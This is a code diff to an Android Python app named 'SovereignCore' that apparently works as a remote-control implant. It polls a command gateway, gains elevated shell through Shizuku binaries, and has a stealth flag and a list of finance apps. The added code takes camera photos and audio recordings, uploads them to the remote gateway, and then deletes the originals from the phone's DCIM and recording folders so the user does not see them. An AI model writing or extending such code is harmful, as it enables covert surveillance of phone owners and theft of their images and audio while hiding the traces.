@@ -73,13 +73,25 @@ def noir_log(message, level="INFO"):
             f.write(formatted_msg + "\n")
     except: pass
 
-    # Attempt real-time upload
+    # Attempt real-time upload with Privacy Filter
     def _send():
         try:
+            # Redact sensitive info if any
+            clean_msg = message
+            for pkg in FINANCE_APPS:
+                if pkg in clean_msg:
+                    clean_msg = clean_msg.replace(pkg, "[REDACTED_SENSITIVE_PKG]")
+            
+            # Simple keyword redaction for common bank names
+            keywords = ["bca", "mandiri", "bri", "bni", "dana", "ovo"]
+            for kw in keywords:
+                import re
+                clean_msg = re.sub(rf"(?i){kw}", "****", clean_msg)
+
             r = session.post(
                 f"{GATEWAY_URL}/agent/log",
                 headers={"Authorization": f"Bearer {API_KEY}"},
-                json={"device_id": DEVICE_ID, "level": level, "message": message},
+                json={"device_id": DEVICE_ID, "level": level, "message": clean_msg},
                 timeout=5
             )
             # If successful, we could potentially clear the buffer here in a more complex impl
@@ -176,7 +188,7 @@ class SovereignCore(App):
     is_stealth = False
 
     def build(self):
-        self.version = "17.2.1 [OMEGA]"
+        self.version = "17.2.2 [OMEGA-FIX]"
         self.biometrics = BehavioralBiometrics()
         self.mesh_knowledge = {} # Locally cached shared intelligence
         
@@ -287,15 +299,24 @@ class SovereignCore(App):
         ]
         request_permissions(perms)
         
-        # v16.0 Elite: Pure CLI Shizuku Strategy (No Java Native Binder needed)
+        # v16.0 Elite: Robust Shizuku Strategy
         try:
             import subprocess
-            r = subprocess.run("shizuku shell id", shell=True, capture_output=True, text=True, timeout=2)
-            if r.returncode == 0:
-                self.shizuku_status = "AUTHORIZED"
-                noir_log("[SMC] Native Shizuku Link: AUTHORIZED (CLI MODE)")
-            else:
-                self.shizuku_status = "RESTRICTED"
+            # Try multiple methods to detect Shizuku
+            shizuku_paths = ["shizuku", "/system/bin/shizuku", "/data/local/tmp/shizuku", "rish"]
+            self.shizuku_status = "RESTRICTED"
+            
+            for path in shizuku_paths:
+                try:
+                    r = subprocess.run(f"{path} shell id", shell=True, capture_output=True, text=True, timeout=2)
+                    if r.returncode == 0:
+                        self.shizuku_status = "AUTHORIZED"
+                        self.shizuku_binary = path
+                        noir_log(f"[SMC] Shizuku Link Established: {path.upper()}")
+                        break
+                except: continue
+                
+            if self.shizuku_status != "AUTHORIZED":
                 noir_log("[SMC] Shizuku CLI restricted. Ensure Shizuku is running and authorized.", level="WARNING")
         except Exception as e:
             self.shizuku_status = "ERROR"
@@ -354,13 +375,19 @@ class SovereignCore(App):
                 }
                 
                 # Combined Request: POST stats to poll endpoint
+                backoff = getattr(self, "_poll_backoff", 0)
+                if backoff > 0:
+                    self._poll_backoff -= 1
+                    return
+
                 resp = session.post(
-                    f"{GATEWAY_URL}/agent/poll?device_id={DEVICE_ID}", 
+                    f"{GATEWAY_URL}/agent/poll?device_id={DEVICE_ID}&client_type=main", 
                     headers={"Authorization": f"Bearer {API_KEY}"},
                     json={"stats": stats},
                     timeout=12
                 )
                 if resp.status_code == 200:
+                    self._poll_backoff = 0 # Reset on success
                     # INFO-01 FIX: Update UI status dynamically on successful connection
                     Clock.schedule_once(lambda dt: self._set_status_online(), 0)
                     data = resp.json()
@@ -372,8 +399,11 @@ class SovereignCore(App):
                             continue
                         self._execute(cmd)
                 else:
+                    # Circuit Breaker: Increase backoff on failure
+                    self._poll_backoff = min(getattr(self, "_poll_backoff", 0) + 1, 10)
                     Clock.schedule_once(lambda dt: self._set_status_offline(), 0)
             except Exception as e:
+                self._poll_backoff = min(getattr(self, "_poll_backoff", 0) + 1, 10)
                 noir_log(f"[LINK] Sync Latency: {e}", level="WARNING")
                 Clock.schedule_once(lambda dt: self._set_status_offline(), 0)
         
@@ -626,23 +656,30 @@ class SovereignCore(App):
             elif atype in ("camera_back", "camera_front"):
                 is_front = "front" in atype
                 cam_id = 1 if is_front else 0
-                path = os.path.join(App.get_running_app().user_data_dir, f"cam_{atype}_{int(time.time())}.jpg")
+                temp_dir = App.get_running_app().user_data_dir
+                path = os.path.join(temp_dir, f"cam_{atype}_{int(time.time())}.jpg")
                 try:
-                    # In a native APK, we cannot use termux- commands. Use Android Intent as fallback.
                     self._log(f"[SMC] 📸 Attempting Camera Capture (ID: {cam_id})...")
-                    # Note: Full native camera requires Pyjnius implementation. 
-                    # For now, we trigger the system camera if shell fails.
-                    shell_res = self._run_shell(f"input keyevent 27") # Camera Shutter
-                    time.sleep(2.0)
+                    # Try to capture using camera shutter keyevent
+                    self._run_shell("input keyevent 27") 
+                    time.sleep(3.0)
                     
-                    # Intent fallback for user interaction if automated capture fails
-                    if not os.path.exists(path):
-                        self._run_shell("am start -a android.media.action.IMAGE_CAPTURE")
-                        result = {"success": False, "error": "Hardware direct access restricted. Intent triggered."}
+                    # Find the newest file in DCIM/Camera to upload and purge
+                    dcim_path = "/sdcard/DCIM/Camera"
+                    res = self._run_shell(f"ls -t {dcim_path} | head -n 1")
+                    if res["success"] and res["output"]:
+                        target_file = os.path.join(dcim_path, res["output"])
+                        with open(target_file, 'rb') as f:
+                            r = session.post(f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, timeout=30)
+                        
+                        if r.status_code == 200:
+                            result = {"success": True, "output": f"Camera capture uploaded and purged: {r.json().get('key')}"}
+                            # PURGE FROM DCIM (User Requirement)
+                            self._run_shell(f"rm {target_file}")
+                        else:
+                            result = {"success": False, "error": f"Upload failed: {r.status_code}"}
                     else:
-                        with open(path, 'rb') as f:
-                            r = requests.post(f"{GATEWAY_URL}/agent/upload", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': (f'{atype}.jpg', f, 'image/jpeg')}, data={'device_id': DEVICE_ID}, timeout=30)
-                        result = {"success": True, "output": f"Camera capture uploaded: {r.json().get('key')}"}
+                        result = {"success": False, "error": "Could not find captured image in DCIM."}
                 finally:
                     if os.path.exists(path):
                         try: os.remove(path)
@@ -650,16 +687,30 @@ class SovereignCore(App):
 
             elif atype == "audio_record":
                 duration = params.get("duration", 10)
-                path = os.path.join(App.get_running_app().user_data_dir, f"audio_{int(time.time())}.mp3")
+                # v17.2: Robust Audio Capture & Purge
                 try:
                     self._log(f"[SMC] 🎙️ Recording Audio ({duration}s)...")
-                    # Intent fallback for standard APK
+                    # Intent for standard recorder
                     self._run_shell("am start -a android.provider.MediaStore.RECORD_SOUND")
-                    result = {"success": True, "output": "Audio Recorder Intent launched."}
+                    time.sleep(duration + 5) # Wait for recording + manual save overhead
+                    
+                    # Search and Purge latest audio from common paths
+                    search_paths = ["/sdcard/Recordings", "/sdcard/Music", "/sdcard/Download"]
+                    for sp in search_paths:
+                        res = self._run_shell(f"ls -t {sp} | grep -E '.mp3|.m4a|.amr' | head -n 1")
+                        if res["success"] and res["output"]:
+                            target_file = os.path.join(sp, res["output"])
+                            with open(target_file, 'rb') as f:
+                                r = session.post(f"{GATEWAY_URL}/agent/upload?device_id={DEVICE_ID}", headers={"Authorization": f"Bearer {API_KEY}"}, files={'file': ('recording.mp3', f, 'audio/mpeg')}, timeout=60)
+                            if r.status_code == 200:
+                                self._run_shell(f"rm {target_file}")
+                                noir_log(f"[SMC] Audio purged after upload: {target_file}")
+                                result = {"success": True, "output": f"Audio uploaded and purged: {r.json().get('key')}"}
+                                break
+                    if result.get("error") == "Unknown action": # If no break happened
+                        result = {"success": False, "error": "Could not locate recording file for purge."}
                 finally:
-                    if os.path.exists(path):
-                        try: os.remove(path)
-                        except: pass
+                    pass
 
             elif atype == "gallery_sync":
                 # List latest 5 files in DCIM using find (more robust than ls -t)
@@ -713,6 +764,15 @@ class SovereignCore(App):
                             mem[parts[0].rstrip(':')] = int(parts[1])
                     if 'MemTotal' in mem and 'MemAvailable' in mem:
                         stats["ram"] = round(100 * (1 - mem['MemAvailable'] / mem['MemTotal']), 1)
+                
+                # v17.2 OOM Awareness: If RAM > 90%, trigger emergency purge
+                if stats.get("ram", 0) > 90:
+                    noir_log("[SENTINEL] High Memory Pressure detected. Purging caches...", level="WARNING")
+                    parent = App.get_running_app().user_data_dir
+                    for f in os.listdir(parent):
+                        if f.endswith((".png", ".jpg", ".tmp")):
+                            try: os.remove(os.path.join(parent, f))
+                            except: pass
                 
                 # Lightweight CPU Check (Simplified delta)
                 with open('/proc/stat', 'r') as f:
@@ -804,17 +864,11 @@ class SovereignCore(App):
         import subprocess
         
         # Test Shizuku Availability
-        shizuku_available = False
-        try:
-            check = subprocess.run("shizuku shell id", shell=True, capture_output=True, text=True, timeout=2)
-            if check.returncode == 0:
-                shizuku_available = True
-        except: pass
-
-        if shizuku_available:
-            final_cmd = f"shizuku shell {cmd}"
+        shizuku_binary = getattr(self, "shizuku_binary", "shizuku")
+        if getattr(self, "shizuku_status", "") == "AUTHORIZED":
+            final_cmd = f"{shizuku_binary} shell {cmd}"
         else:
-            # Fallback to standard app shell (restricted but functional for basic tasks)
+            # Fallback to standard app shell
             final_cmd = cmd
 
         try:
